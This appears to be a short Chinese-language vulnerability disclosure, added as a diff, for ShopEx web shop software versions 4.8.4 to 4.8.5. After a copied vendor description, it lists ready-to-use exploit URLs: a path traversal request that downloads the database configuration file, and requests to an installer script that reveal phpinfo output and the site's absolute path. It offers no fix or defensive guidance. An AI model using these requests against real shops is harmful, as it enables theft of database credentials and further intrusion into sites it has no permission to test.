@@ -1,0 +1,15 @@
+影响版本：shopex V4.8.4 -V4.8.5
+
+shopex 官方简介：
+
+      上海商派网络科技有限公司始于2002年，是国内最早的网店软件提供商之一；是目前国内网店系统持续研发最久的公司；是目前网店软件国内市场占有率最高的软件提供商；是目前网店软件行业内规模最大的公司。ShopEx旗下的网上商店系统、网上商城系统以及丰富的网商工具，以专业的功能、领先的技术以及快速的价值体现，获得了45万用户的肯定。ShopEx秉承”向客户提供最专业的购物模式，做最好的网络购物软件”之理念，一直走在网络购物模式的前沿，致力于最大限度的降低网络购物系统建设成本，并为让网络购物、让电子商务更加走近普通人的生活而不断努力。
+
+漏洞利用：
+
+直接下载数据库配置文件：
+http://hi.baidu.com/qhack8/shopadmin/index.php?ctl=sfile&act=getDB&p[0]=../../config/config.php
+
+暴网站绝对路径：
+http://hi.baidu.com/qhack8/install/svinfo.php?phpinfo=true
+
+http://hi.baidu.com/qhack8/install/svinfo.php?db_host=127.0.0.1:3306
